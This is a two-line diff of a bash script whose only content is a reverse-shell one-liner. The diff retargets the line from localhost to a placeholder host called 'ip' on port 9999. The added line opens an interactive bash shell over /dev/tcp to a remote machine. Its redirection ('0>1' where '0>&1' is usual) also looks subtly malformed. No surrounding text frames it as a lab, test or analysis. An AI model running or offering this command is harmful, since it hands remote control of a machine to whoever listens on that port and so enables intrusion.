@@ -1,2 +1,2 @@
 #!/bin/bash
-bash -i >&/dev/tcp/127.0.0.1/9999 0>1&
+bash -i >&/dev/tcp/ip/9999 0>1&
